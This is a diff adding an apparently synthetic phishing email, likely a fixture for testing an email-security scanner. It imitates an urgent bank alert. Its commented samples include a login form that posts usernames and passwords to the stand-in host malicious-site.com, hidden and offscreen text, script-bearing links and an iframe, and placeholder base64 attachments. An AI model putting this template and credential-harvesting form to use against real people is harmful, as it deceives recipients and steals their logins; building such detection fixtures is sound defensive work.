@@ -1,0 +1,85 @@
+From: urgent.support@bank-security.com
+To: customer@example.com
+Subject: URGENT: Your Account Security Alert - Immediate Action Required
+Date: Thu, 25 Apr 2024 10:00:00 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="boundary123"
+
+--boundary123
+Content-Type: text/html; charset="UTF-8"
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Alert</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Suspicious inline JavaScript
+            document.cookie = "session=stolen";
+        });
+    </script>
+    <style>
+        .hidden { visibility: hidden; }
+        .invisible { opacity: 0; }
+        .tiny { font-size: 1px; color: white; }
+    </style>
+</head>
+<body>
+    <div style="font-family: Arial, sans-serif;">
+        <h1 style="color: red; font-weight: bold;">⚠️ URGENT SECURITY ALERT ⚠️</h1>
+        
+        <!-- Hidden content using various techniques -->
+        <div style="display: none;">Hidden content using style attribute</div>
+        <div class="hidden">Hidden content using CSS class</div>
+        <div class="invisible">Invisible content using opacity</div>
+        <div class="tiny">Tiny white text</div>
+        
+        <!-- Suspicious form -->
+        <form action="http://malicious-site.com/steal" method="POST">
+            <input type="hidden" name="steal_credentials" value="true">
+            <p>Dear Valued Customer,</p>
+            <p>We have detected <span style="color: red;">suspicious activity</span> on your account. 
+            Your account will be <span style="color: red;">suspended</span> in 24 hours unless you verify your identity.</p>
+            
+            <!-- Multiple suspicious links -->
+            <a href="javascript:void(0)" onclick="stealData()">Click here to verify</a><br>
+            <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGFja2VkJyk8L3NjcmlwdD4=">Verify identity</a><br>
+            <a href="file:///C:/Windows/System32">System check</a>
+            
+            <!-- Obfuscated content -->
+            <div style="position: absolute; left: -9999px;">
+                <a href="http://malicious-site.com">Hidden offscreen link</a>
+            </div>
+            
+            <!-- Input fields for credential theft -->
+            <label>Username: <input type="text" name="username"></label><br>
+            <label>Password: <input type="password" name="password"></label><br>
+            <button type="submit">Verify Now</button>
+        </form>
+        
+        <p>If you don't take action, your account will be permanently locked.</p>
+        <p>Best regards,<br>Bank Security Team</p>
+        
+        <!-- Malicious iframe -->
+        <iframe src="javascript:alert('malicious')" style="display:none"></iframe>
+    </div>
+</body>
+</html>
+
+--boundary123
+Content-Type: application/pdf
+Content-Disposition: attachment; filename="security_alert.pdf"
+Content-Transfer-Encoding: base64
+
+JVBERi0xLjcKJeLjz9MKNSAwIG9iago8PC9UeXBlL1hPYmplY3QvQ29sb3JTcGFjZS9EZXZpY2VS
+Z0IvU3VidHlwZS9JbWFnZS9CaXRzUGVyQ29tcG9uZW50IDgvV2lkdGggMTYvTGVuZ3RoIDE3L0ZpbHRl
+ci9GbGF0ZURlY29kZT4+c3RyZWFtCnicY2BgQAX8DAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM
+
+--boundary123
+Content-Type: application/javascript
+Content-Disposition: attachment; filename="tracking.js"
+Content-Transfer-Encoding: base64
+
+Y29uc29sZS5sb2coImluamVjdGVkIHNjcmlwdCIpOw==
+
+--boundary123--
